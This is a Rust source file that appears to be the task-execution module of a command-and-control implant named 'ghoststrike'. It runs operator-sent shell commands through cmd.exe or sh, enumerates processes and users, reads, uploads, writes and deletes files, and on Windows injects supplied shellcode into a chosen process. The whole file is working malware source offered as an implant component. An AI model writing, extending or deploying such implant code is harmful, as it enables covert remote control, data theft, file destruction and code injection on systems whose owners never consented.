use ghoststrike_common::{Task, TaskCommand};
use std::process::Command;

pub async fn execute_task(task: &Task) -> String {
    match &task.command {
        TaskCommand::Shell { cmd }    => run_shell(cmd),
        TaskCommand::Pwd              => run_shell("cd"),
        TaskCommand::Whoami           => run_shell("whoami"),
        TaskCommand::Ps               => run_shell("tasklist"),
        TaskCommand::Ls { path }      => run_shell(&format!("dir \"{}\"", path)),
        TaskCommand::Sleep { .. }     => "sleep set".into(),
        TaskCommand::Exit             => std::process::exit(0),

        TaskCommand::Download { path } => {
            match std::fs::read(path) {
                Ok(b)  => format!("[file] {} bytes", b.len()),
                Err(e) => format!("[error] {e}"),
            }
        }
        TaskCommand::Upload { path, data } => {
            match std::fs::write(path, data) {
                Ok(_)  => format!("[upload] wrote {} bytes to {path}", data.len()),
                Err(e) => format!("[error] {e}"),
            }
        }

        TaskCommand::Cd { path } => {
            match std::env::set_current_dir(path) {
                Ok(_)  => "ok".into(),
                Err(e) => format!("[error] {e}"),
            }
        }
        TaskCommand::Cat { path } => {
            match std::fs::read_to_string(path) {
                Ok(s)  => s,
                Err(e) => format!("[error] {e}"),
            }
        }
        TaskCommand::Rm { path } => {
            match std::fs::remove_file(path) {
                Ok(_)  => "removed".into(),
                Err(e) => format!("[error] {e}"),
            }
        }
        TaskCommand::Mk { path } => {
            match std::fs::create_dir_all(path) {
                Ok(_)  => "created".into(),
                Err(e) => format!("[error] {e}"),
            }
        }

        TaskCommand::Migrate { .. } => "migrate not implemented in Phase 2".into(),

        TaskCommand::Inject { pid, shellcode } => {
            #[cfg(target_os = "windows")]
            {
                match crate::inject::inject(*pid, shellcode) {
                    Ok(tid) => format!(
                        "Injected {} bytes into pid {pid}, thread {tid}",
                        shellcode.len()
                    ),
                    Err(e) => format!("[error] {e}"),
                }
            }
            #[cfg(not(target_os = "windows"))]
            {
                let _ = (pid, shellcode);
                "inject not supported on this platform".into()
            }
        }
    }
}

fn run_shell(cmd: &str) -> String {
    #[cfg(target_os = "windows")]
    let output = Command::new("cmd.exe").args(["/C", cmd]).output();
    #[cfg(not(target_os = "windows"))]
    let output = Command::new("sh").args(["-c", cmd]).output();

    match output {
        Ok(o) => {
            let mut result = String::new();
            if !o.stdout.is_empty() {
                result.push_str(&String::from_utf8_lossy(&o.stdout));
            }
            if !o.stderr.is_empty() {
                result.push_str(&String::from_utf8_lossy(&o.stderr));
            }
            result
        }
        Err(e) => format!("[error] {e}"),
    }
}
